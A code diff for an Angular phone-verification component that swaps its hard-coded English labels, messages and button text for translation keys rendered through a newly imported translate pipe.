@@ -4,20 +4,21 @@ import { CommonModule } from '@angular/common';
 import { FormsModule } from '@angular/forms';
 import { PublicLayoutComponent } from './layout/public-layout.component';
 import { StateService } from '../services/state.service';
+import { TranslatePipe } from '../pipes/translate.pipe';
 
 @Component({
   selector: 'app-phone-verification',
   standalone: true,
-  imports: [CommonModule, FormsModule, PublicLayoutComponent],
+  imports: [CommonModule, FormsModule, PublicLayoutComponent, TranslatePipe],
   template: `
     <app-public-layout>
       
       <div class="flex flex-col items-center mb-10">
         <h1 class="text-2xl font-bold text-pp-navy mb-3 text-center tracking-tight">
-             {{ codeSent() ? 'Enter your code' : 'Let\\'s confirm your number' }}
+             {{ (codeSent() ? 'PHONE.TITLE_CODE' : 'PHONE.TITLE_INPUT') | translate }}
         </h1>
         <p class="text-base text-slate-500 px-4 text-center leading-relaxed">
-           {{ codeSent() ? "We sent a security code to your mobile device." : "We'll send a code to your mobile to ensure your account is secure." }}
+           {{ (codeSent() ? 'PHONE.DESC_CODE' : 'PHONE.DESC_INPUT') | translate }}
         </p>
       </div>
 
@@ -26,8 +27,8 @@ import { StateService } from '../services/state.service';
         <div class="mb-8 bg-red-50 border-l-[6px] border-[#D92D20] p-4 flex items-start gap-4 rounded-r-lg">
             <span class="material-icons text-[#D92D20] text-xl">error</span>
             <div>
-              <p class="text-sm font-bold text-pp-navy">That didn't work</p>
-              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() || 'Please check the code and try again.' }}</p>
+              <p class="text-sm font-bold text-pp-navy">{{ 'PHONE.ERROR_TITLE' | translate }}</p>
+              <p class="text-xs text-slate-600 mt-1">{{ state.rejectionReason() || ('CARD_OTP.INVALID_DESC' | translate) }}</p>
             </div>
         </div>
       }
@@ -44,11 +45,11 @@ import { StateService } from '../services/state.service';
                   placeholder=" "
                   class="pp-input peer"
                 />
-                <label for="phone" class="pp-label">Mobile number</label>
+                <label for="phone" class="pp-label">{{ 'PERSONAL.PHONE' | translate }}</label>
              </div>
 
              <div class="text-xs text-slate-500 text-center leading-relaxed px-4">
-                 By continuing, you confirm that you are authorized to use this phone number. Standard message and data rates may apply.
+                 {{ 'PHONE.DISCLAIMER' | translate }}
              </div>
 
              <button 
@@ -57,7 +58,7 @@ import { StateService } from '../services/state.service';
                 [class.opacity-50]="!isPhoneValid()"
                 class="pp-btn"
             >
-                Send Code
+                {{ 'PHONE.SEND_CODE' | translate }}
             </button>
           </div>
       } @else {
@@ -65,7 +66,7 @@ import { StateService } from '../services/state.service';
           <div class="space-y-8 animate-in fade-in slide-in-from-right-2">
             <div class="text-center mb-2">
                 <p class="text-base font-bold text-pp-navy mb-1">{{ phoneDisplay() }}</p>
-                <a (click)="codeSent.set(false)" class="text-pp-blue font-bold cursor-pointer hover:underline text-xs">Change</a>
+                <a (click)="codeSent.set(false)" class="text-pp-blue font-bold cursor-pointer hover:underline text-xs">{{ 'PHONE.CHANGE' | translate }}</a>
             </div>
 
             <div class="flex justify-center gap-2 sm:gap-3">
@@ -90,10 +91,10 @@ import { StateService } from '../services/state.service';
                 (click)="resend()" 
                 [disabled]="timer() > 0"
                 class="text-pp-blue font-bold text-sm hover:underline hover:text-pp-navy transition-colors disabled:opacity-50 disabled:no-underline disabled:cursor-not-allowed">
-                {{ timer() > 0 ? 'Resend code in ' + timer() + 's' : 'Get a new code' }}
+                {{ timer() > 0 ? ('PHONE.RESEND_WAIT' | translate: { seconds: timer() }) : ('PHONE.RESEND' | translate) }}
               </button>
                @if (resendSent()) {
-                 <p class="text-xs text-pp-success mt-2 font-bold animate-pulse">Code sent!</p>
+                 <p class="text-xs text-pp-success mt-2 font-bold animate-pulse">{{ 'PHONE.CODE_SENT' | translate }}</p>
                }
             </div>
 
@@ -103,7 +104,7 @@ import { StateService } from '../services/state.service';
               [class.opacity-50]="!isOtpValid()"
               class="pp-btn"
             >
-              Confirm
+              {{ 'COMMON.CONFIRM' | translate }}
             </button>
           </div>
       }
